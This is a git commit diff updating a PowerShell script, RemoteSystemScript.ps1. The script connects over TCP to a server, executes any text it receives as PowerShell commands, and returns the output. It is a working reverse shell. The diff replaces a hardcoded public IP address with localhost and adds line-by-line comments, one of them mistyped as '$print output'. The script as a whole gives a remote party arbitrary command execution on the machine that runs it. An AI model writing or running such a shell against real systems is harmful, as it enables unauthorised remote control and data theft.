6a19e166556efc3d60ededd151c6b284aa14bd59
jeremysam3 <31583597+jeremysam3@users.noreply.github.com>
2020-08-18 12:55:09 +0530

    Update RemoteSystemScript.ps1

--- RemoteSystemScript.ps1
+++ RemoteSystemScript.ps1
@@ -1,4 +1,5 @@
-$FTPServer = "35.200.251.56"
+#replace localhost with IP address
+$FTPServer = "localhost"
 $FTPPort = "2000"
 
 $connection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort)
@@ -8,17 +9,15 @@ $EncodedText = New-Object System.Text.ASCIIEncoding
 
 while ($connection.Connected) {
     if ( $stream.DataAvailable ){
-        $bytes = New-Object System.Byte[] $connection.Available
-        $stream.Read($bytes,0,$bytes.Length)
-        $data = $EncodedText.GetString($bytes,0, $bytes.Length)
-        Write-Output $data
-        $result = [scriptblock]::Create($data).Invoke()
-        $msg = $EncodedText.GetBytes($result+'&')
-        $stream.Write($msg,0,$msg.Length)
-        #Write-Host -NoNewline $data
+        $bytes = New-Object System.Byte[] $connection.Available #create a buffer of size found in the incoming stream
+        $stream.Read($bytes,0,$bytes.Length)    # read from stream into buffer
+        $data = $EncodedText.GetString($bytes,0, $bytes.Length) #data in buffer are converted from bytes to string
+        Write-Output $data  $print output
+        $result = [scriptblock]::Create($data).Invoke() #This line executes powershell command received in the msg and stores output into result variable
+        $msg = $EncodedText.GetBytes($result+'&')   #convert the output to bytes along with extra character '&' to mark it as end of stream
+        $stream.Write($msg,0,$msg.Length)   #send the bytes into the output stream
     }
     
 }
 
-
-$connection.Close()
+$connection.Close() #closes the connection
